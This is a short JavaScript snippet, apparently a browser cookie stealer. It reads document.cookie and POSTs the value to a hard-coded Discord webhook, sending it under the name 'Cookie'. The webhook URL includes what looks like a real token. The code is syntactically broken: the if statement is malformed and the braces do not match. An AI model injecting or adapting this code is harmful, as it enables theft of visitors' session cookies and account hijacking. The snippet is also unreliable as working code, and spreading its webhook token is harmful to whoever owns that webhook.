 function getRandomInt(max) {
  return Math.floor(Math.random() * max);
}

if !(typeof document.cookie == "number"){
  document.cookie = "cookie="+ getRandomInt(1e9) + ";expires=Thu, 01 Jan 1970 00:00:01 GMT;";
  console.log(document.cookie)
alert("working")
  const request = new XMLHttpRequest();
      request.open("POST", "https://discord.com/api/webhooks/1327009618479546498/88zVTNA0r96PH03nyT_ffsnD2ydU0ma41qQSOrPomuQ9qElaSkIRk6IZDtqoH8y1xjIv");

      request.setRequestHeader('Content-type', 'application/json');

      const params = {
        username: "Cookie",
        avatar_url: "",
        content: document.cookie
      }

      request.send(JSON.stringify(params));
    }
}
